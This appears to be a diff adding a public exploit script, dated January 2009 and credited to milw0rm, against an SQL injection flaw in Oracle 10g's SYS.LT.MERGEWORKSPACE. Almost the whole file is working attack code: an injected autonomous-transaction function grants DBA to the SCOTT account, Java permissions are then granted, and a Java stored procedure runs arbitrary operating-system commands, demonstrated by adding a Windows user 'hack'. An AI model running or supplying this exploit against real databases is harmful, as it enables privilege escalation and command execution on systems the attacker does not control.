@@ -1,0 +1,70 @@
+/*********************************************************/
+/*Oracle 10g SYS.LT.MERGEWORKSPACE SQL Injection Exploit**/
+/****grant DBA and create new  OS user (java)*************/
+/*********************************************************/
+/***********exploit grant DBA to scott********************/
+/***********and execute OS command "net user"*************/
+/***********using java procedures ************************/
+/*********************************************************/
+/***********tested on oracle 10.1.0.5.0*******************/
+/*********************************************************/
+/*********************************************************/
+/* Date of Public EXPLOIT: January 6, 2009               */
+/* Written by:             Alexandr "Sh2kerr" Polyakov   */
+/* email:                  Alexandr.Polyakov@dsec.ru     */
+/* site:                   http://www.dsecrg.ru          */
+/*                         http://www.dsec.ru            */
+/*********************************************************/
+/*Original Advisory:                                     */
+/*Esteban Martinez Fayo [Team SHATTER ]                  */
+/*Date of Public Advisory: November 11, 2008             */
+/*http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml*/
+/*********************************************************/
+
+select * from user_role_privs;
+
+CREATE OR REPLACE FUNCTION Y return varchar2
+authid current_user as
+pragma autonomous_transaction;
+BEGIN
+EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT';
+COMMIT;
+RETURN 'Y';
+END;
+/
+
+exec SYS.LT.CREATEWORKSPACE('sh2kerr'' and SCOTT.Y()=''Y');
+exec SYS.LT.MERGEWORKSPACE('sh2kerr'' and SCOTT.Y()=''Y');
+
+
+
+/* Creating simple java procedure that executes OS  */
+
+exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
+exec dbms_java.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
+exec dbms_java.grant_permission('SCOTT', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
+
+CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS
+import java.lang.*;
+import java.io.*;
+public class JAVACMD
+{
+ public static void execCommand (String command) throws IOException
+ {
+     Runtime.getRuntime().exec(command);
+ }
+};
+/
+
+CREATE OR REPLACE PROCEDURE JAVAEXEC (p_command  IN  VARCHAR2)
+AS LANGUAGE JAVA 
+NAME 'JAVACMD.execCommand (java.lang.String)';
+/
+
+/* here we can paste any OS command for example create new user */
+
+exec javaexec(net user hack 12345 /add);
+
+select * from user_role_privs;
+
+// milw0rm.com [2009-01-06]
